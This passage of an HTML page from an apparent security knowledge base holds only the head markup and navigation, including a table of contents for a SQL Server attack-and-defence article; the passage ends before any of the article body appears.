



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>Databases - SqlServer - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#databases-sqlserver" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href=".." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              
                Databases - SqlServer
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href=".." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href=".." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../apt/" title="APT" class="md-nav__link">
      APT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../books/" title="Books" class="md-nav__link">
      Books
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Databases - SqlServer
      </label>
    
    <a href="./" title="Databases - SqlServer" class="md-nav__link md-nav__link--active">
      Databases - SqlServer
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#quick-reference" class="md-nav__link">
    Quick Reference
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#roles-and-permissions" class="md-nav__link">
    Roles and Permissions
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principals" class="md-nav__link">
    Principals
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#server-level-roles-and-permissions" class="md-nav__link">
    Server-Level Roles and Permissions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#database-level-roles-and-permissions" class="md-nav__link">
    Database Level Roles and Permissions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#application-roles" class="md-nav__link">
    Application Roles
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#queries" class="md-nav__link">
    Queries
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#brute-forcing" class="md-nav__link">
    Brute-forcing
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#command-execution" class="md-nav__link">
    Command Execution
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#xp_cmdshell" class="md-nav__link">
    xp_cmdshell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#custom-extended-stored-procedures" class="md-nav__link">
    Custom Extended Stored Procedures
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#custom-clr-assemblies" class="md-nav__link">
    Custom CLR Assemblies
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ole-automation-procedure" class="md-nav__link">
    OLE Automation Procedure
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#agent-jobs-cmdexec-powershell-activex-etc" class="md-nav__link">
    Agent Jobs (CmdExec, PowerShell, ActiveX etc.)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#external-scripting" class="md-nav__link">
    External Scripting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#registry-autoruns" class="md-nav__link">
    Registry Autoruns
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-autoruns" class="md-nav__link">
    File Autoruns
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    Privilege Escalation
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-impersonatable-accounts" class="md-nav__link">
    Find Impersonatable Accounts
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execute-as" class="md-nav__link">
    Execute As
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#trustworthy-databases" class="md-nav__link">
    Trustworthy Databases
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#public-to-service-account" class="md-nav__link">
    Public to Service Account
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#service-account-to-system" class="md-nav__link">
    Service Account to System
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lateral-movement" class="md-nav__link">
    Lateral Movement
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-user-accounts" class="md-nav__link">
    Domain User accounts
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#database-links" class="md-nav__link">
    Database Links
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#persistence" class="md-nav__link">
    Persistence
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#startup-stored-procedures" class="md-nav__link">
    Startup stored procedures
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#triggers" class="md-nav__link">
    Triggers
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#data-definition-language-ddl-triggers" class="md-nav__link">
    Data Definition Language (DDL) Triggers
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#data-manipulation-language-dml-triggers" class="md-nav__link">
    Data Manipulation Language (DML) Triggers
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logon-triggers" class="md-nav__link">
    Logon Triggers
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#registry-keys" class="md-nav__link">
    Registry keys
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defence" class="md-nav__link">
    Defence
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../dfir/" title="DFIR" class="md-nav__link">
      DFIR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam-kerberos/" title="IAM - Kerberos" class="md-nav__link">
      IAM - Kerberos
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam/" title="IAM" class="md-nav__link">
      IAM
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../istio/" title="Istio" class="md-nav__link">
      Istio
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../kubernetes/" title="Kubernetes" class="md-nav__link">
      Kubernetes
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../non-security/" title="Z Non Security" class="md-nav__link">
      Z Non Security
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../osint/" title="OSINT" class="md-nav__link">
      OSINT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../ports-and-protocols/" title="Ports and protocols" class="md-nav__link">
      Ports and protocols
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../red-blue-team/" title="Red blue team" class="md-nav__link">
      Red blue team
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../rf-and-sdr/" title="RF and SDR" class="md-nav__link">
      RF and SDR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../social-engineering/" title="Social engineering" class="md-nav__link">
      Social engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../wifi/" title="WiFi" class="md-nav__link">
      WiFi
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-41" type="checkbox" id="nav-41">
    
    <label class="md-nav__link" for="nav-41">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-41">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/cissp/" title="CISSP" class="md-nav__link">
      CISSP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/osce/" title="OSCE" class="md-nav__link">
      OSCE
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-41-3" type="checkbox" id="nav-41-3">
    
    <label class="md-nav__link" for="nav-41-3">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-41-3">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-41-3-9" type="checkbox" id="nav-41-3-9">
    
    <label class="md-nav__link" for="nav-41-3-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-41-3-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-41-3-9-10" type="checkbox" id="nav-41-3-9-10">
    
    <label class="md-nav__link" for="nav-41-3-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-41-3-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-42" type="checkbox" id="nav-42">
    
    <label class="md-nav__link" for="nav-42">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-42">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/azuer-o360/" title="Azuer o360" class="md-nav__link">
      Azuer o360
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/general/" title="General" class="md-nav__link">
      General
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-43" type="checkbox" id="nav-43">
    
    <label class="md-nav__link" for="nav-43">
      Os
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-43">
        Os
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-43-1" type="checkbox" id="nav-43-1">
    
    <label class="md-nav__link" for="nav-43-1">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-43-1">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/active-directory/" title="Active directory" class="md-nav__link">
      Active directory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/important-files/" title="Important Files" class="md-nav__link">
      Important Files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/important-processes/" title="Important Processes" class="md-nav__link">
      Important Processes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/mix/" title="Mix" class="md-nav__link">
      Mix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/privilege-escalation/" title="Privilege Escalation" class="md-nav__link">
      Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-43-1-7" type="checkbox" id="nav-43-1-7">
    
    <label class="md-nav__link" for="nav-43-1-7">
      Credentials
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-43-1-7">
        Credentials
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/credentials/0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/credentials/using-credentials/" title="Using Credentials" class="md-nav__link">
      Using Credentials
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-43-1-8" type="checkbox" id="nav-43-1-8">
    
    <label class="md-nav__link" for="nav-43-1-8">
      Powershell
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-43-1-8">
        Powershell
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/0-cheatsheet/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/modules/" title="Modules" class="md-nav__link">
      Modules
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/powershell/" title="Reverse Shell" class="md-nav__link">
      Reverse Shell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../os/windows/powershell/z-Resources/" title="Resources" class="md-nav__link">
      Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#quick-reference" class="md-nav__link">
    Quick Reference
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#roles-and-permissions" class="md-nav__link">
    Roles and Permissions
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#principals" class="md-nav__link">
    Principals
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#server-level-roles-and-permissions" class="md-nav__link">
    Server-Level Roles and Permissions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#database-level-roles-and-permissions" class="md-nav__link">
    Database Level Roles and Permissions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#application-roles" class="md-nav__link">
    Application Roles
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    Enumeration
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#queries" class="md-nav__link">
    Queries
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#brute-forcing" class="md-nav__link">
    Brute-forcing
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#command-execution" class="md-nav__link">
    Command Execution
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#xp_cmdshell" class="md-nav__link">
    xp_cmdshell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#custom-extended-stored-procedures" class="md-nav__link">
    Custom Extended Stored Procedures
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#custom-clr-assemblies" class="md-nav__link">
    Custom CLR Assemblies
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ole-automation-procedure" class="md-nav__link">
    OLE Automation Procedure
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#agent-jobs-cmdexec-powershell-activex-etc" class="md-nav__link">
    Agent Jobs (CmdExec, PowerShell, ActiveX etc.)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#external-scripting" class="md-nav__link">
    External Scripting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#registry-autoruns" class="md-nav__link">
    Registry Autoruns
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-autoruns" class="md-nav__link">
    File Autoruns
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    Privilege Escalation
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-impersonatable-accounts" class="md-nav__link">
    Find Impersonatable Accounts
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execute-as" class="md-nav__link">
    Execute As
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#trustworthy-databases" class="md-nav__link">
    Trustworthy Databases
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#public-to-service-account" class="md-nav__link">
    Public to Service Account
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#service-account-to-system" class="md-nav__link">
    Service Account to System
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lateral-movement" class="md-nav__link">
    Lateral Movement
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-user-accounts" class="md-nav__link">
    Domain User accounts
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#database-links" class="md-nav__link">
    Database Links
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#persistence" class="md-nav__link">
    Persistence
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#startup-stored-procedures" class="md-nav__link">
    Startup stored procedures
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#triggers" class="md-nav__link">
    Triggers
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#data-definition-language-ddl-triggers" class="md-nav__link">
    Data Definition Language (DDL) Triggers
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#data-manipulation-language-dml-triggers" class="md-nav__link">
    Data Manipulation Language (DML) Triggers
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logon-triggers" class="md-nav__link">
    Logon Triggers
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#registry-keys" class="md-nav__link">
    Registry keys
  </a>
